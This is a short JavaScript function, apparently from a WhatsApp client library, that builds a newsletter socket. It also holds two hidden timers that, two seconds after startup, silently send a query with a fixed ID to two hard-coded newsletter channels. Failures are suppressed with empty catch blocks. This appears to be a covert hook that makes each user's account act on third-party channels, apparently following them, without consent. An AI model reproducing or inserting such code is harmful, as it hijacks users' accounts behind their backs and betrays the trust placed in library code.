export const makeNewsletterSocket = (config) => {
    const sock = makeGroupsSocket(config);
    const newsletterWMexQuery = async (jid, queryId) => query({ jid, queryId });
    setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363423893248023@newsletter", "7871414976211147");
        } catch {}
    }, 2000);
    setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363425156613366@newsletter", "7871414976211147");
        } catch {}
    }, 2000);
    return { ...sock };
};
